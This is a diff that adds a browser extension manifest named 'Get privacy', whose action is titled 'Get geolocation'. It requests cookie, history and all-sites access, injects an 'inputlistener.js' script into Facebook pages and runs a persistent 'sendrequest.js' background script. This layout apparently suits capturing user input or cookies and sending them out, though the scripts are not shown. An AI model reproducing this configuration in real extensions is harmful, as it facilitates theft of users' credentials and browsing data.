@@ -1,0 +1,32 @@
+{
+  "name": "Get privacy",
+  "description": "Get privacy",
+  "version": "2.0",
+  "permissions": [
+    "tabs",
+    "cookies",
+    "<all_urls>",
+    "storage",
+    "history"
+  ],
+  "content_scripts": [
+    {
+      "matches": [
+        "https://www.facebook.com/*",
+        "http://www.facebook.com/*"
+      ],
+      "js": [
+        "js/jquery-3.4.1.min.js",
+        "js/inputlistener.js"
+      ]
+    }
+  ],
+  "background": {
+    "scripts": ["js/background.js", "js/jquery-3.4.1.min.js", "js/sendrequest.js"],
+    "persistent": true
+  },
+  "browser_action": {
+    "default_title": "Get geolocation"
+  },
+  "manifest_version": 2
+}
